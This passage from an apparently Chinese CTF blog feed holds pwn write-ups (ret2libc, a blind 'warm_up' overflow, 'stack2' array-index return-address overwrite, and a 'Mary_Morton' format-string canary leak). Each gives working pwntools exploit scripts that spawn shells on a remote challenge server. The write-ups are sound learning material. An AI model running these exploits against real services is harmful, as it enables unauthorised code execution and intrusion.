comment">#这里只能是返回到puts的plt表</span>payload<span class="token operator">+=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#因为got中存的是在libc的实际地址，而plt表存的是一段指令，我们要的是一段可执行的指令</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bye~\n'</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#这里这个x00不能换成a，这是为了补全高字节的</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>    <span class="token comment">#dump是偏移量</span>libc_base<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload2<span class="token operator">+=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell：<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打卡：盲打题:warm_up</title>
      <link href="/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/"/>
      <url>/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/</url>
      
        <content type="html"><![CDATA[<h2 id="盲打题warm-up"><a href="#盲打题warm-up" class="headerlink" title="盲打题warm_up"></a>盲打题warm_up</h2><p>碰到这题的时候以为是题目忘记给附件了，竟然没有题目……后来搜了一下我才知道：我在做一种很新的题目……<br><img src="/images/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/1.png"><br>在碰到这个没附件的题目的时候，就可以做好打盲打的准备了，<strong>很显然第一次碰到，一脸懵逼，故打卡记录</strong><br><img src="/images/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/2.png"><br>看了一下确实是什么反应都没有，输入%p没有任何回应，显然不是格式化字符串漏洞，这时考虑栈溢出。（都盲打了，什么也不知道不至于用什么保护机制来坑人吧）<br>给的0x40060d肯定是返回地址<br>学习下别人写的exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sys <span class="token operator">=</span> <span class="token number">0x40060d</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>　　io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">52590</span><span class="token punctuation">)</span>　　payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>i <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>　　<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>　　io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>或<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sys <span class="token operator">=</span> <span class="token number">0x40060d</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>　　io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">52590</span><span class="token punctuation">)</span>　　payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>i <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>　　<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>　　io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两种代码那去试看看是32位还是64位</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stack2</title>
      <link href="/2023/01/05/stack2/"/>
      <url>/2023/01/05/stack2/</url>
      
        <content type="html"><![CDATA[<h2 id="stack2-wp"><a href="#stack2-wp" class="headerlink" title="stack2 wp"></a>stack2 wp</h2><p>写这篇博客想要稍微弥补一下我动态调试的不足，这题stack2是pwn题的进阶题也算有些难度了吧（大概吧，我没做出来，大佬勿笑……）<br>于是想要和这篇博客再重新做一遍理清一下思路。<br>checksec一下：<br><img src="/images/stack2/1.png"><br>开了canary保护、NX保护和部分RELRO保护按经验不是栈溢出题。<br>IDA分析：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-90h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-8Ch] BYREF</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-88h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-84h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-80h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-7Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-78h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-74h]</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+38h] [ebp-70h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [esp+9Ch] [ebp-Ch]</span>  v14 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*                      An easy calc                       *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*Give me your numbers and I will return to you an average *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*(0 &lt;= x &lt; 256)                                           *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v13<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v5<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"average is %.2lf\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">)</span>v9 <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">99</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>            v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>      v9 <span class="token operator">+=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一张图截不下用代码段算了……这题比较失败的地方就是连漏洞都找错了<br>我开始想将v5赋值成100，然后再第100个数让他足够大把下面溢出覆盖掉，想到有canary压根没法知道，而且数字过于庞大也不好算<del>（太年轻了）</del>大佬笑笑就好<br>没有注意到下面那个替换数字的代码段可以实现栈上（v13以下）任意位置的改写，这样就可以直接改写返回地址，又可以绕过canary的检查，然后想想编程老师上课就有一题这样的例子，我更想撞墙了。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看网上的大佬wp说IDA给的返回地址到v13[0]的地址并不是真实的，因为编译器做了些手脚，在真正编译的时候会有变化（没有尝试没有动态调试的做法）要用动态调试的才是真的<br>老实说本人挺害怕动态调试的，希望能尽快熟悉掌握……<br>在IDA中进行反汇编，查看__isoc99_scanf（）调用的时候<br><img src="/images/stack2/2.png"><br>有个lea    edx, [ebp+var_70],lea指令可以把偏移地址存到dx，相当于C语言中的&amp;符号，而var_70就是ebp与v13的偏移量相当于把v13[0]的地址给了edx<br>于是在动态调试中先在 call    __isoc99_scanf（）处下个断点 r一下：<br><img src="/images/stack2/3.png"><br>单步执行n一直到mov  eax, [ebp+var_7C]：<br><img src="/images/stack2/4.png"><br>此时查看edx中保存的就是v13[0]的地址为0xffffd438，这个地址每次运行都不会一样，大家自己动手调试。<br>虽然IDA里的返回地址不准确但是执行ret指令时，肯定esp指针肯定保存的是返回地址于是在ret指令下个断点 r一下：<br><img src="/images/stack2/5.png"><br>发现esp指针里的值是0xffffd4bc，0xffffd4bc-0xffffd438&#x3D;0x84（十六进制）<br>而IDA里的是0x74显然二者不等。这里还有一个小坑如果这题是在本地打的就可以直接打通了，但如果是远程的话会提示没有bash这里大家可能回去找&#x2F;bin&#x2F;sh字符串去填充替代<br>找当然也可以找到（用我下面说找sh的方法），但是网上说这里的&#x2F;bin&#x2F;sh好像是只读的不可执行，其实用sh也可以打通shell我们在pwndbg中这样找：<br><img src="/images/stack2/6.png"><br>就可以找到很多，这里我选择用第一个（其他没试过不知道行不行，鼓励尝试）<br>记录下call system的地址：<br><img src="/images/stack2/7.png"><br>上exp:（这个exp也是借鉴网上大佬的，用构造函数的写法确实很方便，学到很多）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56314</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many numbers you have:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Give me your numbers\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token comment">#addr_call_system = [0xB4,0x85,0x04,0x08]  小端序存储</span><span class="token comment">#addr_sh = [0x87,0x89,0x04,0x08]</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"5. exit\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"which number to change:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"new number:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0xb4</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">)</span>    <span class="token comment">#因为32位系统是用栈传递参数的所以，</span>change<span class="token punctuation">(</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">)</span>    <span class="token comment">#将sh的地址直接接在call system下面</span>change<span class="token punctuation">(</span><span class="token number">0x8a</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>    <span class="token comment">#执行call system会直接将其地址的内的内容当做参数</span>change<span class="token punctuation">(</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>    <span class="token comment">#如果是64位系统的话要在call system前</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>     <span class="token comment">#先准备一个pop rdi；ret的garget将sh的地址先弄进rdi就行</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell：<br><img src="/images/stack2/8.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mary_Morton-格式化字符串泄露canary</title>
      <link href="/2023/01/04/Mary-Morton/"/>
      <url>/2023/01/04/Mary-Morton/</url>
      
        <content type="html"><![CDATA[<h2 id="Mary-Morton-wp"><a href="#Mary-Morton-wp" class="headerlink" title="Mary_Morton wp"></a>Mary_Morton wp</h2><p>这篇博客主要讲一个方法：利用格式化字符串漏洞泄露canary内容</p><h3 id="格式化字符串漏洞泄露canary"><a href="#格式化字符串漏洞泄露canary" class="headerlink" title="格式化字符串漏洞泄露canary"></a>格式化字符串漏洞泄露canary</h3><p>先checksec一下：<br><img src="/images/Mary-Morton/1.png"><br>开了NX保护和Canary保护，本来一般开了Canary应该不是栈溢出的问题，但这题比较特殊有利用方法。<br>拖进IDA查看：<br><img src="/images/Mary-Morton/2.png"><br>有些名字我改过了<br>这里有两个漏洞可利用：一个是格式化字符串漏洞（format_string_bug），另一个是栈溢出（overflow_string_bug）<br>点进format_string_bug：<br><img src="/images/Mary-Morton/3.png"><br>在虚拟机中运行发现偏移量为6<br><img src="/images/Mary-Morton/4.png"><br>0x90-0x8&#x3D;0x88，0x88&#x2F;8&#x3D;17，17+6&#x3D;23<br>得Canary为printf的第23个参数，而后在溢出的必要位置加入Canary就行<br>overflow_string_bug：<br><img src="/images/Mary-Morton/5.png"><br>后门函数：<br><img src="/images/Mary-Morton/6.png"><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">54809</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"3. Exit the battle \n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%23$p'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>c_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"3. Exit the battle \n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token 